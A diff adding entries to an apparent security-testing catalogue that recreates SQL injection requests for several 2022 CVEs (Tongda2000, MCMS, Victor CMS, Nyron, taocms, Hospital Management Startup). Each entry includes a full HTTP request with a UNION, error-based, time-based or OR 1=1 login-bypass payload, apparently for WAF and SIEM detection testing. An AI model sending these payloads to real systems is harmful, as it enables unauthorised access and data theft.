@@ -378788,6 +378788,366 @@
     "visible": true
   },
   {
+    "name": "CVE-2022-23902 - Tongda2000 OA SQL Injection",
+    "displayName": "CVE-2022-23902 - Tongda2000 OA SQL Injection",
+    "description": "Tongda2000 v11.10 contains a SQL injection vulnerability in export_data.php via the d_name parameter. The request sends a UNION SELECT payload in d_name. HTTP method inferred as GET (export/data-retrieval style parameter); the CVE description names the file and argument (VulDB-style entry point). No vendor WAF rule found; built from the CVE description.\n\nReferences used to recreate this request:\n- https://www.cve.org/CVERecord?id=CVE-2022-23902 (CVE record)\n- http://note.youdao.com/noteshare?id=7b52ec937a029a1b2c7f994d4b174583 (original PoC note, referenced by CVE)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /export_data.php?d_name=1%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-23902"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "cve_record for CVE-2022-23902",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2022-23902"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-23899 - MCMS SQL Injection",
+    "displayName": "CVE-2022-23899 - MCMS SQL Injection",
+    "description": "MCMS v5.2.5 contains a SQL injection vulnerability in the search action (MCmsAction.java, request mapping /{searchId}/search). The PoC (GitHub issue #63) shows the injectable POST parameter is basic_title at /cms/1/search.do. The request sends a UNION SELECT payload in basic_title. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/ming-soft/MCMS/issues/63 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-23899 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /cms/1/search.do HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: JSESSIONID=dummy\n\nbasic_title=q%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20-\n"
+    },
+    "cves": [
+      "CVE-2022-23899"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-23899",
+        "link": "https://github.com/ming-soft/MCMS/issues/63"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-23898 - MCMS SQL Injection",
+    "displayName": "CVE-2022-23898 - MCMS SQL Injection",
+    "description": "MCMS v5.2.5 contains a SQL injection vulnerability via the categoryId parameter mapped in IContentDao.xml. The PoC (GitHub issue #62) shows the injectable endpoint is POST /cms/content/list with parameter categoryId. The request sends an error-based updatexml payload in categoryId. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/ming-soft/MCMS/issues/62 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-23898 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /cms/content/list HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: JSESSIONID=dummy\n\ncategoryId=1%27%20AND%20updatexml(1%2Cconcat(0x7e%2Cdatabase()%2C0x7e)%2C1)--%20-\n"
+    },
+    "cves": [
+      "CVE-2022-23898"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-23898",
+        "link": "https://github.com/ming-soft/MCMS/issues/62"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-23873 - Victor CMS SQL Injection",
+    "displayName": "CVE-2022-23873 - Victor CMS SQL Injection",
+    "description": "Victor CMS v1.0 contains a SQL injection vulnerability via the user_firstname parameter, reached through the admin/users.php?source=add_user component (crafted POST request; confirmed via the linked CVE PoC and companion Victor CMS advisories that name this component and parameter set). The request sends a boolean SQLi payload in user_firstname. No vendor WAF rule found; built from the PoC/advisory.\n\nReferences used to recreate this request:\n- https://github.com/truonghuuphuc/CVE/blob/main/CVE-2022-23873.pdf (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-23873 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/users.php?source=add_user HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nuser_name=admin&user_firstname=x%27%20OR%201%3D1--%20-&user_lastname=x&user_email=x%40x.com&user_password=x&user_role=1&add_user=\n"
+    },
+    "cves": [
+      "CVE-2022-23873"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-23873",
+        "link": "https://github.com/truonghuuphuc/CVE/blob/main/CVE-2022-23873.pdf"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-23865 - Nyron SQL Injection",
+    "displayName": "CVE-2022-23865 - Nyron SQL Injection",
+    "description": "Nyron 1.0 contains a SQL injection vulnerability in Nyron/Library/Catalog/winlibsrch.aspx via the thes1 parameter (CVE names the exact path and parameter). The request sends a UNION SELECT payload in thes1. HTTP method GET (search form query parameter). No vendor WAF rule found; built from the CVE description and Exploit-DB PoC.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/50674 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-23865 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /Nyron/Library/Catalog/winlibsrch.aspx?thes1=%27%20UNION%20SELECT%20NULL--%20- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2022-23865"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "windows",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2022-23865",
+        "link": "https://www.exploit-db.com/exploits/50674"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-23380 - taocms SQL Injection",
+    "displayName": "CVE-2022-23380 - taocms SQL Injection",
+    "description": "taocms 3.0.2 contains a SQL injection vulnerability in the id parameter of the admin edit action (admin/admin.php?action=admin&ctrl=edit). The PoC (GitHub issue #16) shows a time-based blind payload in id. The request sends AND SLEEP(5) in id. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/taogogo/taocms/issues/16 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-23380 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /admin/admin.php?action=admin&id=2+AND+SLEEP(5)--+&ctrl=edit HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-23380"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-23380",
+        "link": "https://github.com/taogogo/taocms/issues/16"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-23366 - Hospital Management Startup SQL Injection",
+    "displayName": "CVE-2022-23366 - Hospital Management Startup SQL Injection",
+    "description": "Hospital Management Startup (HMS) v1.0 contains a SQL injection vulnerability in patientlogin.php. The Exploit-DB PoC (50729) confirms the injectable POST parameter is loginid. The request sends an OR 1=1 authentication-bypass payload in loginid. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/50729 (PoC)\n- https://github.com/kabirkhyrul/HMS/discussions/4 (PoC discussion)\n- https://www.cve.org/CVERecord?id=CVE-2022-23366 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /patientlogin.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nloginid=%27%20OR%201%3D1--%20-&password=dummy&rememberme=&submit=\n"
+    },
+    "cves": [
+      "CVE-2022-23366"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2022-23366",
+        "link": "https://www.exploit-db.com/exploits/50729"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-23365 - Hospital Management Startup SQL Injection",
+    "displayName": "CVE-2022-23365 - Hospital Management Startup SQL Injection",
+    "description": "Hospital Management Startup (HMS) v1.0 contains a SQL injection vulnerability in doctorlogin.php. The Exploit-DB PoC (50729, Multiple SQLi) confirms the injectable POST parameter on the login forms is loginid. The request sends an OR 1=1 authentication-bypass payload in loginid. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/50729 (PoC)\n- https://github.com/kabirkhyrul/HMS/discussions/4 (PoC discussion)\n- https://www.cve.org/CVERecord?id=CVE-2022-23365 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /doctorlogin.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nloginid=%27%20OR%201%3D1--%20-&password=dummy&rememberme=&submit=\n"
+    },
+    "cves": [
+      "CVE-2022-23365"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2022-23365",
+        "link": "https://www.exploit-db.com/exploits/50729"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2026-5838 - PHPGurukul News Portal Project SQL Injection",
     "displayName": "CVE-2026-5838 - PHPGurukul News Portal Project SQL Injection",
     "description": "PHPGurukul News Portal Project 4.1 is vulnerable to SQL injection via the sadminusername argument of /admin/add-subadmins.php (the admin 'add sub-admin' form). The request submits a time-based (SLEEP) SQL injection payload in the sadminusername field, matching an OWASP CRS 942 SQLi signature. No vendor WAF rule found; built from the VulDB-style CVE description (the GitHub issue PoC was unreachable in this environment, so the HTTP method was inferred as a POST form submission).\n\nReferences used to recreate this request:\n- https://github.com/f1rstb100d/CVE/issues/27 (PoC - GitHub issue, unreachable in this environment)\n- https://vuldb.com/vuln/356294 (VulDB entry)\n- https://nvd.nist.gov/vuln/detail/CVE-2026-5838 (NVD record)\n- https://www.cve.org/CVERecord?id=CVE-2026-5838 (CVE record)",
